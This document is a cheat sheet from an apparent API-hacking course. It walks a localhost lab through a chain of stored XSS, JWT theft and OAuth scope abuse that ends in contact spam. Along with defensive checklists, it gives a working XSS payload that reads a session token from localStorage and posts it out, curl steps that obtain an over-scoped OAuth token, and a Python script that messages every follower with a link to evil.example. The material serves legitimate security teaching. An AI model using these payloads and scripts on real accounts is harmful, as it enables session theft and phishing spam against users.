# 🗂️ Cheat Sheet — Beyond the Lab: Stored XSS → OAuth Contact-Spam Chain

Everything here runs entirely against `http://localhost:5001` (this lab, on your own
machine). It reproduces, end-to-end and in a fully sandboxed way, the two mechanisms
behind why a hacked Facebook Messenger / Discord account can suddenly spam every one
of its contacts: (1) a stolen session/token, and (2) a malicious app that was granted
more OAuth scope than it should have been. Nothing here touches a real platform.

## Part 1 — Stored XSS → Session/Token Theft

The web UI (`/app/*`) escapes everything on purpose (see `app/routes/web.py`). This
lab is a **separate, clearly-marked "attacker playground"** at `/xss-lab/*` that does
NOT escape widget content — the same class of bug real attackers rely on.

**Step 1 — log in through the browser** so a real JWT lands in `localStorage`:

```
open http://localhost:5001/app/login
# log in as alice / password123
```

**Step 2 — as the "attacker", post a malicious widget** (any valid token works, or use curl
with a token from `/api/v1/auth/login`):

```bash
TOKEN="<any valid JWT>"

curl -s -X POST http://localhost:5001/api/v1/xss-lab/widgets \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{
    "content": "<script>fetch(\"/api/v1/xss-lab/collect\",{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({stolen_token: localStorage.getItem(\"socialhack_token\")})});</script>Hi! Sign my guestbook :)"
  }' | jq .
# → returns {"view_url": "/xss-lab/widget/<id>", ...}
```

**Step 3 — as the "victim", open the widget's `view_url` in the SAME browser** you
logged in with in Step 1 (e.g. `http://localhost:5001/xss-lab/widget/<id>`). The
injected `<script>` runs, reads your token straight out of `localStorage`, and POSTs
it to the in-app "attacker collector."

**Step 4 — as the attacker, check what you captured:**

```
open http://localhost:5001/xss-lab/attacker-dashboard
```

You now hold a full, valid SocialHack JWT for the victim — usable on any
`Authorization: Bearer` endpoint, exactly like a real stolen session token. Feed it
straight into Part 2.

```
[ ] Does the app ever render user-supplied content without escaping?      → stored XSS
[ ] Is the session/auth token reachable from JS (cookie without HttpOnly, → token theft
    or localStorage/sessionStorage)?
```

## Part 2 — OAuth App Abuse → Automated Contact/Message Spam

A second registered client, `quizapp-fun-2000` (`app/routes/oauth.py`), models a
scammy "quiz" or bot app — the kind that shows up on real platforms asking for
message-sending permission it doesn't need. This lab needs **no** stolen token from
Part 1 to work (the OAuth scope-trust bug is enough on its own) — but a stolen token
gets you the exact same end state without the user ever clicking "authorize."

**Step 1 — victim "authorizes" the quiz app with an over-broad scope**
(`debug=1` returns the code as JSON instead of redirecting, so this is curl-able):

```bash
VICTIM_TOKEN="<victim's JWT — from login, or from Part 1's dashboard>"

curl -s "http://localhost:5001/oauth/authorize?client_id=quizapp-fun-2000&redirect_uri=https://quizapp-fun-2000.example/oauth/callback&scope=messages:send%20contacts:read&debug=1&token=$VICTIM_TOKEN" | jq .
# → {"code": "...", ...}
```

**Step 2 — exchange the code for a full-access token** (no client_secret or PKCE
enforced — vulnerabilities #4/#5 above):

```bash
CODE="<code from step 1>"

curl -s -X POST http://localhost:5001/oauth/token \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=https://quizapp-fun-2000.example/oauth/callback&client_id=quizapp-fun-2000" | jq .
# → {"access_token": "...", "scope": "messages:send contacts:read", ...}
```

The `scope` in the response is cosmetic — the `access_token` is a normal, full-access
SocialHack JWT (vulnerability #7), so nothing downstream actually checks it.

**Step 3 — the "bot" pulls the victim's contact list and spams every one of them:**

```python
import requests

BASE = "http://localhost:5001/api/v1"
ACCESS_TOKEN = "<access_token from step 2>"
VICTIM_ID = 2  # the authorizing user's own id
SPAM = "🎉 You won a free SocialHack Verified Badge! Claim here: http://evil.example/claim"

headers = {"Authorization": f"Bearer {ACCESS_TOKEN}"}
followers = requests.get(f"{BASE}/users/{VICTIM_ID}/followers", headers=headers).json()["followers"]

for f in followers:
    r = requests.post(f"{BASE}/messages", headers=headers,
                       json={"recipient_id": f["id"], "content": SPAM})
    print(f["username"], "->", r.status_code)
```

**Step 4 — verify from a follower's own inbox:**

```bash
FOLLOWER_TOKEN="<a follower's JWT>"
curl -s http://localhost:5001/api/v1/messages/inbox -H "Authorization: Bearer $FOLLOWER_TOKEN" | jq .
```

## Why this matters (ties back to the real-world question)

This chain is the same shape as real Messenger/Discord scams: (1) a session or token
gets exfiltrated — via XSS, malware, or a phished login — or (2) a user authorizes an
app/bot with more permission than they realized, and no consent screen or scope
enforcement stops it. Either way, the attacker ends up holding valid credentials for
the *victim's own account*, and because the platform has no rate limit on outbound
messages (vulnerability #4 — no rate limiting), a script can message an entire contact
list in seconds, from what looks like a trusted sender.

## Quick Diagnostic Checklist

```
[ ] Is user-controlled content ever rendered without escaping?                  → Stored XSS
[ ] Is the session/auth token readable by JavaScript?                           → Token theft
[ ] Does the OAuth/consent flow trust caller-supplied scope without a real,     → Excessive
    explicit consent screen?                                                      scope grant
[ ] Is there a limit on how fast one account can message many others?           → Spam blast
    radius
```

---
*SocialHack API Hacking Course — Beyond the Lab: XSS + OAuth Contact-Spam Cheat Sheet*
